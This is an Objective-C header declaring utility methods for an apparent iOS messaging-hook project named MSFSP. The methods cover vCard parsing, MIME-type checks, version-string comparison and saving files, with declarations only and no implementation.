//
//  IMShareUtils.h
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 6/19/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>


@interface IMShareUtils : NSObject {

}

+ (NSString *) getVCardStringFromData: (NSData *) aVCardData;
+ (NSString *) getVCardStringFromDataV2: (NSData *) aVCardData;
+ (NSString *) mimeType: (NSString*) aFullPath;

+ (NSArray *) parseVersion: (NSString *) aVersion;

+ (NSInteger) compareVersion: (NSString *) aVersion1
				 withVersion: (NSString *) aVersion2;

+ (BOOL) isVersion: (NSArray *) aFirstVersion 
	greaterOrEqual: (NSArray *) aSecondVersion;
+ (BOOL) isVersion: (NSArray *) aFirstVersion
             equal: (NSArray *) aSecondVersion;

+ (BOOL) isCurrentVersionGreaterOrEqual: (NSString *) aOtherVersionString;
+ (BOOL) isCurrentVersionEqual: (NSString *) aOtherVersionString;
+ (BOOL) isCurrentVersionLessThan: (NSString *) aOtherVersionString;

+ (BOOL) isVersion: (NSArray *) aFirstVersion 
		 lowerThan: (NSArray *) aSecondVersion;


+ (BOOL) isVersionText: (NSString *) aFirstVersion isHigherThan: (NSString *) aSecondVersion;
+ (BOOL) isVersionText: (NSString *) aFirstVersion isLessThan: (NSString *) aSecondVersion;
+ (BOOL) isVersionText: (NSString *) aFirstVersion isLessThanOrEqual:(NSString *) aSecondVersion;
+ (BOOL) isVersionText: (NSString *) aFirstVersion isHigherThanOrEqual:(NSString *) aSecondVersion;

+ (BOOL) shouldHookInCurrentVersion: (NSString *) aCurrentVersion
			   withBundleIdentifier: (NSString *) aBundleIdentifier;

+ (BOOL) isVideo: (NSString*) aFullPath;

+ (BOOL) isImageMimetype: (NSString *) aMediaName;
+ (BOOL) isVideoMimetype: (NSString *) aMediaName;

+ (NSString *) saveData: (NSData *) aData toDocumentSubDirectory: (NSString *) aSubDirectory fileName: (NSString *) aFileName;

@end
